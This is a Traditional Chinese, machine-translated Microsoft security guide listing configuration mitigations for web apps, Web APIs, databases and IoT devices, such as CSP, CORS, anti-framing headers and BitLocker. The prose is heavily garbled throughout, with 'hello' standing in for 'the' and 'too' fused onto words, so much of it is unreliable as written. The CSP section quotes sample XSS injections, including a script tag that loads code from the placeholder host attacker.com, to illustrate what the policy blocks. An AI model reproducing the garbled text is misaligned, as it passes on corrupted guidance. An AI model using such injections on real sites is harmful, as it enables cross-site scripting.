---
title: "Azure 管理-Microsoft 威脅模型化工具-aaaConfiguration |Microsoft 文件"
description: "hello 威脅模型化工具中公開的威脅防護功能"
services: security
documentationcenter: na
author: RodSan
manager: RodSan
editor: RodSan
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 08/17/2017
ms.author: rodsan
ms.openlocfilehash: 77aa4352fa61e928a1b7a4ff1d488a55d3d9b970
ms.sourcegitcommit: 523283cc1b3c37c428e77850964dc1c33742c5f0
ms.translationtype: MT
ms.contentlocale: zh-TW
ms.lasthandoff: 10/06/2017
---
# <a name="security-frame-configuration-management--mitigations"></a>安全框架︰組態管理 | 緩和措施 
| 產品/服務 | 文章 |
| --------------- | ------- |
| **Web 應用程式** | <ul><li>[實作內容安全性原則 (CSP)，並停用內嵌 javascript](#csp-js)</li><li>[啟用瀏覽器的 XSS 篩選器](#xss-filter)</li><li>[追蹤和偵錯先前 toodeployment，必須先停用 ASP.NET 應用程式](#trace-deploy)</li><li>[僅從信任的來源存取第三方 javascript](#js-trusted)</li><li>[確保已驗證的 ASP.NET 頁面納入 UI 偽裝或點擊劫持防禦功能](#ui-defenses)</li><li>[確保在 ASP.NET Web 應用程式上啟用 CORS 的情況下只允許信任的原始來源](#cors-aspnet)</li><li>[在 ASP.NET 頁面上啟用 ValidateRequest 屬性](#validate-aspnet)</li><li>[使用在本機裝載的最新 JavaScript 程式庫版本](#local-js)</li><li>[停用自動 MIME 探查](#mime-sniff)</li><li>[移除 standard 的伺服器上 Windows Azure Web Sites tooavoid 指紋識別的標頭](#standard-finger)</li></ul> |
| **資料庫** | <ul><li>[設定用於 Database Engine 存取的 Windows 防火牆](#firewall-db)</li></ul> |
| **Web API** | <ul><li>[確保在 ASP.NET Web API 上啟用 CORS 的情況下只允許信任的原始來源](#cors-api)</li><li>[加密包含敏感性資料的 Web API 組態檔區段](#config-sensitive)</li></ul> |
| **IoT 裝置** | <ul><li>[確保使用強式認證保護所有系統管理介面](#admin-strong)</li><li>[確保無法在裝置上執行不明的程式碼](#unknown-exe)</li><li>[使用 Bitlocker 將 IoT 裝置的 OS 和其他磁碟分割加密](#partition-iot)</li><li>[確定只有 hello 最少服務/功能已啟用裝置上](#min-enable)</li></ul> |
| **IoT 現場閘道** | <ul><li>[使用 Bitlocker 將 IoT 現場閘道的 OS 和其他磁碟分割加密](#field-bit-locker)</li><li>[請確定在安裝期間，會變更的 hello 欄位閘道 hello 預設登入認證](#default-change)</li></ul> |
| **IoT 雲端閘道** | <ul><li>[確定該 hello 雲端閘道實作 toodate 註冊程序 tookeep hello 連接裝置韌體](#cloud-firmware)</li></ul> |
| **電腦信任邊界** | <ul><li>[確保裝置已根據組織的原則設定端點安全性控制項](#controls-policies)</li></ul> |
| **Azure 儲存體** | <ul><li>[確保 Azure 儲存體存取金鑰的安全管理](#secure-keys)</li><li>[確保在 Azure 儲存體上啟用 CORS 的情況下只允許信任的原始來源](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[啟用 WCF 的服務節流功能](#throttling)</li><li>[WCF-透過中繼資料的資訊洩漏](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>實作內容安全性原則 (CSP)，並停用內嵌 javascript

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | [簡介 tooContent 安全性原則](http://www.html5rocks.com/en/tutorials/security/content-security-policy/)，[內容安全性原則參照](http://content-security-policy.com/)，[安全性功能](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)，[簡介 toocontent 安全性原則](https://docs.webplatform.org/wiki/tutorials/content-security-policy)，[我可以使用 CSP 嗎？](http://caniuse.com/#feat=contentsecuritypolicy) |
| **步驟** | <p>內容安全性原則 (CSP) 為深度防禦的安全性機制，W3C 標準，可讓 web 應用程式擁有者 toohave 控制項 hello 內容內嵌在其站台上。 CSP 會加入成為 hello web 伺服器上的 HTTP 回應標頭，並且在 hello 用戶端瀏覽器會強制執行。 這是以白名單為基礎的原則 - 網站可以宣告一組可從中載入主動式內容 (例如 JavaScript) 的受信任網域。</p><p>CSP 提供下列安全性優點的 hello:</p><ul><li>**防止 XSS:**如果分頁是很容易遭受 tooXSS，攻擊者可以利用它 2 的方式：<ul><li>插入 `<script>malicious code</script>`。 此利用將無法運作到期 tooCSP 的限制-1 為基底</li><li>插入 `<script src=”http://attacker.com/maliciousCode.js”/>`。 Hello 攻擊者控制網域都不會在網域的 CSP 的允許清單中，此利用將無法運作</li></ul></li><li>**控制資料滲透：** CSP 如果網頁上的任何惡意內容嘗試 tooconnect tooan 外部網站，並竊取資料，將會中止 hello 的連接。 這是因為 hello 目標網域，都不會在 CSP 的白名單</li><li>**防禦機制以防止按一下 jacking:**按一下 jacking 是一種攻擊技巧使用敵人可以框架正版的網站，並強制使用者 tooclick UI 項目上。 目前可藉由設定回應標頭- X-Frame-Options 來防禦點擊劫持。 並非所有瀏覽器尊重此標頭，並將正向 CSP 會針對按一下 jacking 標準方式 toodefend</li><li>**即時攻擊 reporting:** CSP 啟用網站的資料隱碼攻擊時，瀏覽器將會自動觸發 hello 網頁伺服器上設定的通知 tooan 端點。 如此一來，CSP 可當作即時警告系統。</li></ul> |

### <a name="example"></a>範例
範例原則︰ 
```C#
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
此原則可讓指令碼 tooload 只能從 hello web 應用程式的伺服器和 google analytics 伺服器。 將會拒絕從任何其他網站載入的指令碼。 CSP 是在網站上啟用，hello 下列功能會自動停用的 toomitigate XSS 攻擊。 

### <a name="example"></a>範例
將不會執行內嵌指令碼。 以下是內嵌指令碼的範例 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>範例
字串不會評估為程式碼。 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>啟用瀏覽器的 XSS 篩選器

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | [XSS 防護篩選器](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **步驟** | <p>X XSS 保護回應標頭設定控制項 hello 瀏覽器的跨網站指令碼的篩選條件。 此回應標頭可以有下列值︰</p><ul><li>`0:`這會停用 hello 篩選</li><li>`1: Filter enabled`Hello 瀏覽器偵測到跨網站指令碼的攻擊時，在訂單 toostop hello 攻擊中，將會處理 hello 頁面</li><li>`1: mode=block : Filter enabled`。 Hello 瀏覽器而非淨化 hello 頁面上，，偵測到 XSS 攻擊時，會防止 hello 頁面的轉譯</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`。 hello 瀏覽器將會處理 hello 頁面和報表 hello 違規。</li></ul><p>這是利用 CSP 違規報告 toosend 詳細資料 tooa 您選擇的 URI Chromium 函式。 hello 最後 2 個選項會視為安全的值。</p>|

## <a id="trace-deploy"></a>追蹤和偵錯先前 toodeployment，必須先停用 ASP.NET 應用程式

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | [ASP.NET 偵錯概觀](http://msdn2.microsoft.com/library/ms227556.aspx)、[ASP.NET 追蹤概觀](http://msdn2.microsoft.com/library/bb386420.aspx)、[作法：對 ASP.NET 應用程式啟用追蹤](http://msdn2.microsoft.com/library/0x5wc973.aspx)、[作法：對 ASP.NET 應用程式啟用偵錯](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **步驟** | Hello 頁面啟用追蹤時，每個瀏覽器要求的方式也會取得包含內部伺服器狀態和工作流程的相關資料的 hello 追蹤資訊。 這項資訊可能是安全性相關資訊。 Hello 頁面啟用偵錯時，完整的堆疊追蹤資料中的 hello 伺服器結果上發生的錯誤會呈現 toohello 瀏覽器。 該資料可能會公開有關伺服器 hello 的工作流程的敏感的安全性資訊。 |

## <a id="js-trusted"></a>僅從信任的來源存取第三方 javascript

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | N/A  |
| **步驟** | 僅能從信任的來源參照第三方 JavaScript。 hello 參考端點應該一律是在 SSL 上。 |

## <a id="ui-defenses"></a>確保已驗證的 ASP.NET 頁面納入 UI 偽裝或點擊劫持防禦功能

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | [OWASP 點擊劫持防禦功能提要](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet)、[IE 內部 - 使用 X-Frame-Options 對抗點擊劫持](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/) |
| **步驟** | <p>按一下 jacking 也稱為 「 UI 賠償攻擊 」，是當攻擊者會使用多個透明或不透明的層級 tootrick 使用者按一下按鈕或連結在另一個頁面上，當它們所想 tooclick hello 最上層頁面上。</p><p>這個分層達成製作惡意的頁面上，使用 iframe，載入 hello 受害者的頁面。 因此，hello 攻擊者 「 攔截 」 按一下適用於其頁面，進行路由 tooanother 頁面上，最有可能擁有的另一個應用程式、 網域，或兩者。 tooprevent 按一下 jacking 攻擊組 hello 適當 X 框架選項 HTTP 回應標頭，以指示 hello 瀏覽器 toonot 允許從其他網域的框架</p>|

### <a name="example"></a>範例
可以透過 IIS 的 web.config 設定 hello X 框架選項標頭。決不能進行框架處理之網站的 Web.config 程式碼片段︰ 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>範例
只有所包覆的網站的 Web.config 程式碼中的分頁 hello 相同網域： 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>確保在 ASP.NET Web 應用程式上啟用 CORS 的情況下只允許信任的原始來源

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | Web Form、MVC5 |
| **屬性**              | N/A  |
| **參考**              | N/A  |
| **步驟** | <p>瀏覽器安全性可防止網頁進行 AJAX 要求 tooanother 網域。 這項限制稱為 hello 相同來源原則，並防止惡意網站從其他站台讀取的機密資料。 不過，有時可能需要的 tooexpose Api 安全地其他站台也適用。 跨原始資源共用 (CORS) 是 toorelax hello 相同來源原則，可讓伺服器 W3C 標準。 使用 CORS，伺服器可以明確允許某些跨源要求，然而拒絕其他要求。</p><p>相較於早期技術 (例如 JSONP)，CORS 較為安全且更具彈性。 基本上，啟用 CORS 轉譯 tooadding 少數的 HTTP 回應標頭 (存取控制-*) 完成 toohello web 應用程式，而這幾種方式。</p>|

### <a name="example"></a>範例
是否可存取 tooWeb.config，CORS 可以加入下列程式碼的 hello 透過： 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="http://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>範例
如果找不到存取 tooweb.config，則可設定 CORS 加 hello 遵循 CSharp 程式碼： 
```C#
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
```

請注意，它是關鍵 tooensure hello 的 「 存取控制-允許-原始 」 屬性中的原始來源清單，請將設定 tooa 有限且受信任組的來源。 這不適當地失敗 tooconfigure (例如，設定 hello 值做為 ' *') 可讓惡意網站 tootrigger 跨原始要求 toohello web 應用程式 > 沒有任何限制，因而讓 hello 應用程式容易遭受 tooCSRF 攻擊。 

## <a id="validate-aspnet"></a>在 ASP.NET 頁面上啟用 ValidateRequest 屬性

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | Web Form、MVC5 |
| **屬性**              | N/A  |
| **參考**              | [要求驗證 - 預防指令碼攻擊](http://www.asp.net/whitepapers/request-validation) |
| **步驟** | <p>要求驗證，自 1.1 版的 ASP.NET 功能防止 hello 伺服器接受內容包含未編碼的 HTML。 此功能設計 toohelp 避免讓用戶端指令碼或 HTML 可以不知情的情況下送出的 tooa 伺服器、 儲存，並接著呈現 tooother 使用者部分指令碼資料隱碼攻擊。 我們仍強烈建議您驗證所有輸入資料，而且適時進行 HTML 編碼。</p><p>藉由比較有潛在危險的值的所有輸入的資料 tooa 清單執行要求驗證。 如果相符，ASP.NET 會引發 `HttpRequestValidationException`。 預設會啟用要求驗證功能。</p>|

### <a name="example"></a>範例
不過，這項功能可以在頁面層級停用︰ 
```XML
<%@ Page validateRequest="false" %> 
```
或在應用程式層級停用 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
請注意，要求驗證功能不受支援，而且不是 MVC6 管線的一部分。 

## <a id="local-js"></a>使用在本機裝載的最新 JavaScript 程式庫版本

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | N/A  |
| **步驟** | <p>使用 JQuery 之類標準 JavaScript 程式庫的開發人員必須使用已核准且不包含已知安全性缺陷的通用 JavaScript 程式庫版本。 最好的作法是 toouse hello 最新版的 hello 程式庫，因為它們包含其較舊版本中的已知弱點的安全性修正程式。</p><p>如果因為 toocompatibility 原因無法使用 hello 最新版本，就應該使用 hello 最低版本如下。</p><p>可接受的最小版本︰</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Validate 1.9</li><li>JQuery Mobile 1.0.1</li><li>JQuery Cycle 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Ajax Control Toolkit**<ul><li>Ajax Control Toolkit 40412</li></ul></li><li>**ASP.NET Web Form 和 Ajax**<ul><li>ASP.NET Web Form 和 Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>決不會從外部網站 (例如 public CDN) 載入任何 JavaScript 程式庫</p>|

## <a id="mime-sniff"></a>停用自動 MIME 探查

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | [IE8 Security Part V：完善的保護](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx)、[MIME 類型](http://en.wikipedia.org/wiki/Mime_type) |
| **步驟** | hello X 內容-類型選項標頭是可讓開發人員的 HTTP 標頭，其內容不應為 MIME 探查 toospecify。 此標頭是設計的 toomitigate MIME 探查攻擊。 針對可包含使用者可控制內容的每個頁面上，您必須使用 hello HTTP 標頭 X-內容-類型的選項： nosniff。 tooenable hello 必要的標頭全域的 hello 應用程式中的所有頁面，您可以 hello 下列其中一種|

### <a name="example"></a>範例
如果 hello 應用程式裝載在由網際網路資訊服務 (IIS) 7 及更新版本，請在 hello web.config 檔案中加入 hello 標頭。 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>範例
加入透過 hello hello 標頭全域應用程式\_BeginRequest 
```C#
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>範例
實作自訂 HTTP 模組 
```C#
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>範例
您可以將它加入 tooindividual 回應啟用 hello 必要的標頭標記僅適用於特定頁面： 

```C#
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>移除 standard 的伺服器上 Windows Azure Web Sites tooavoid 指紋識別的標頭

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | EnvironmentType - Azure |
| **參考**              | [移除 Windows Azure 網站上的標準伺服器標頭](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **步驟** | 標頭，例如伺服器、 X-電源-，X AspNet 版本顯示 hello 伺服器和 hello 基礎技術相關的資訊。 建議 toosuppress 這些標頭，因此可以防止 指紋 hello 應用程式 |

## <a id="firewall-db"></a>設定用於 Database Engine 存取的 Windows 防火牆

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | 資料庫 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | SQL Azure、OnPrem |
| **屬性**              | N/A、SQL 版本 - V12 |
| **參考**              | [如何 tooconfigure Azure SQL database 防火牆](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/)，[設定用於 Database Engine 存取的 Windows 防火牆](https://msdn.microsoft.com/library/ms175043) |
| **步驟** | 防火牆系統有助於預防未經授權的存取 toocomputer 資源。 tooaccess 透過防火牆 hello SQL Server Database Engine 的執行個體，您必須執行 SQL Server tooallow 存取 hello 電腦上設定 hello 防火牆 |

## <a id="cors-api"></a>確保在 ASP.NET Web API 上啟用 CORS 的情況下只允許信任的原始來源

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web API | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | MVC 5 |
| **屬性**              | N/A  |
| **參考**              | [在 ASP.NET Web API 2 中啟用跨源要求](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api)、[ASP.NET Web API - ASP.NET Web API 2 中的 CORS 支援](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **步驟** | <p>瀏覽器安全性可防止網頁進行 AJAX 要求 tooanother 網域。 這項限制稱為 hello 相同來源原則，並防止惡意網站從其他站台讀取的機密資料。 不過，有時可能需要的 tooexpose Api 安全地其他站台也適用。 跨原始資源共用 (CORS) 是 toorelax hello 相同來源原則，可讓伺服器 W3C 標準。</p><p>使用 CORS，伺服器可以明確允許某些跨源要求，然而拒絕其他要求。 相較於早期技術 (例如 JSONP)，CORS 較為安全且更具彈性。</p>|

### <a name="example"></a>範例
在 hello App_Start/WebApiConfig.cs，加入下列程式碼 toohello WebApiConfig.Register 方法 hello 
```C#
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>範例
EnableCors 屬性可以套用的 tooaction 控制器中的方法，如下所示： 

```C#
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

請注意，它是關鍵 tooensure hello EnableCors 屬性中的原始來源的清單，請將設定 tooa 有限且受信任組的來源。 這不適當地失敗 tooconfigure (例如，設定 hello 值做為 ' *') 可讓惡意網站 tootrigger 跨原始要求 toohello API 沒有任何限制，> 因此 hello API tooCSRF 容易遭受攻擊。 可以在控制器層級裝飾 EnableCors。 

### <a name="example"></a>範例
在類別中的特定方法的 toodisable CORS hello 的 DisableCors 屬性可以使用，如下所示： 
```C#
[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of hello [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web API | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | MVC 6 |
| **屬性**              | N/A  |
| **參考**              | [在 ASP.NET Core 1.0 中啟用跨源要求](https://docs.asp.net/en/latest/security/cors.html)。 |
| **步驟** | <p>在 ASP.NET Core 1.0 中，可以使用中介軟體或使用 MVC 啟用 CORS。 當使用 MVC tooenable CORS hello 相同 CORS 服務使用，但 hello CORS 中介軟體不是。</p>|

**方法 1**啟用 CORS 中介軟體： hello 整個應用程式的 CORS tooenable 新增 hello CORS 中介軟體 toohello 要求管線 hello UseCors 擴充方法。 新增使用 hello CorsPolicyBuilder 類別 hello CORS 中介軟體時，就可以指定跨原始原則。 有兩種方式 toodo 這樣：

### <a name="example"></a>範例
hello 第一個是 toocall UseCors 與 lambda。 hello lambda 採用 CorsPolicyBuilder 物件： 
```C#
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("http://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>範例
hello 第二種是 toodefine 其中一個或多個具名 CORS 原則，然後選取 hello 原則依名稱執行階段。 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("http://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**方法 2** MVC 中的啟用 CORS： 開發人員可以使用 MVC tooapply 特定的 CORS，每個動作，每個控制站，或全域的所有控制站。

### <a name="example"></a>範例
每個動作： toospecify CORS 原則特定的動作加入 hello [EnableCors] 屬性 toohello 動作。 指定 hello 原則名稱。 
```C#
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>範例
每個控制站︰ 
```C#
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>範例
全域︰ 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
請注意，它是關鍵 tooensure hello EnableCors 屬性中的原始來源的清單，請將設定 tooa 有限且受信任組的來源。 這不適當地失敗 tooconfigure (例如，設定 hello 值做為 ' *') 可讓惡意網站 tootrigger 跨原始要求 toohello API 沒有任何限制，> 因此 hello API tooCSRF 容易遭受攻擊。 

### <a name="example"></a>範例
toodisable CORS 控制器或動作，使用 hello [DisableCors] 屬性。 
```C#
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>加密包含敏感性資料的 Web API 組態檔區段

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web API | 
| **SDL 階段**               | 部署 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | [如何： 加密組態區段，在 ASP.NET 2.0 使用 DPAPI](https://msdn.microsoft.com/library/ff647398.aspx)，[指定受保護的組態提供者](https://msdn.microsoft.com/library/68ze1hb2.aspx)，[使用 Azure 金鑰保存庫 tooprotect 應用程式密碼](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **步驟** | 例如 hello Web.config 組態檔，appsettings.json 通常會使用 toohold 機密資訊，包括使用者名稱、 密碼、 資料庫連接字串，以及加密金鑰。 如果不保護這項資訊，您的應用程式是很容易遭受 tooattackers 或惡意使用者取得敏感性資訊，例如帳戶使用者名稱和密碼、 資料庫名稱和伺服器名稱。 根據 hello 部署類型 （azure/內部），加密 hello 機密使用 DPAPI 或服務，例如 Azure 金鑰保存庫的組態檔區段。 |

## <a id="admin-strong"></a>確保使用強式認證保護所有系統管理介面

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | IoT 裝置 | 
| **SDL 階段**               | 部署 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | N/A  |
| **步驟** | 任何系統管理介面 hello 裝置或欄位閘道會公開應該使用強式認證保護。 此外，對於任何公開的介面 (如 WiFi、SSH、檔案共用)，應使用強式認證保護 FTP。 不得使用預設弱式密碼。 |

## <a id="unknown-exe"></a>確保無法在裝置上執行不明的程式碼

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | IoT 裝置 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | [在 Windows 10 IoT Core 上啟用安全開機和 BitLocker 裝置加密](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
| **步驟** | UEFI 安全開機限制 hello 系統 tooonly 允許執行指定的授權單位簽署的二進位檔。 這項功能會讓不明的程式碼 hello 平台上執行，而且可能會降低它的 hello 安全性狀態。 啟用 UEFI 安全開機，並限制 hello 的受信任程式碼簽章的憑證授權單位。 登入使用一個 hello 信任授權單位的 hello 裝置部署的所有程式碼。 |

## <a id="partition-iot"></a>使用 Bitlocker 將 IoT 裝置的 OS 和其他磁碟分割加密

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | IoT 裝置 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | N/A  |
| **步驟** | Windows 10 IoT 核心實作元保險箱裝置加密，它具有強式相依性的 TPM hello 平台上，包括 hello 必要 preOS 通訊協定進行 hello 必要度量的 UEFI 中的 hello 存在輕量版。 這些 preOS 度量，請確定該作業系統稍後所最終記錄的方式啟動 hello OS 的 hello。加密作業系統使用的資料分割元保險箱和任何額外的資料分割也以防它們會儲存任何機密資料。 |

## <a id="min-enable"></a>確定只有 hello 最少服務/功能已啟用裝置上

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | IoT 裝置 | 
| **SDL 階段**               | 部署 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | N/A  |
| **步驟** | 請勿啟用或關閉的任何功能或服務在 hello 的 hello 運作 hello 方案不需要的作業系統。 如例如如果 hello 裝置不需要部署 UI toobe，安裝 Windows IoT 核心版中遠端控制的模式。 |

## <a id="field-bit-locker"></a>使用 Bitlocker 將 IoT 現場閘道的 OS 和其他磁碟分割加密

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | IoT 現場閘道 | 
| **SDL 階段**               | 部署 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | N/A  |
| **步驟** | Windows 10 IoT 核心實作元保險箱裝置加密，它具有強式相依性的 TPM hello 平台上，包括 hello 必要 preOS 通訊協定進行 hello 必要度量的 UEFI 中的 hello 存在輕量版。 這些 preOS 度量，請確定該作業系統稍後所最終記錄的方式啟動 hello OS 的 hello。加密作業系統使用的資料分割元保險箱和任何額外的資料分割也以防它們會儲存任何機密資料。 |

## <a id="default-change"></a>請確定在安裝期間，會變更的 hello 欄位閘道 hello 預設登入認證

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | IoT 現場閘道 | 
| **SDL 階段**               | 部署 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | N/A  |
| **步驟** | 請確定在安裝期間，會變更的 hello 欄位閘道 hello 預設登入認證 |

## <a id="cloud-firmware"></a>確定該 hello 雲端閘道實作 toodate 註冊程序 tookeep hello 連接裝置韌體

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | IoT 雲端閘道 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | 閘道選擇 - Azure IoT 中樞 |
| **參考**              | [IoT 中樞裝置管理概觀](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/)，[如何 tooupdate 裝置韌體](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
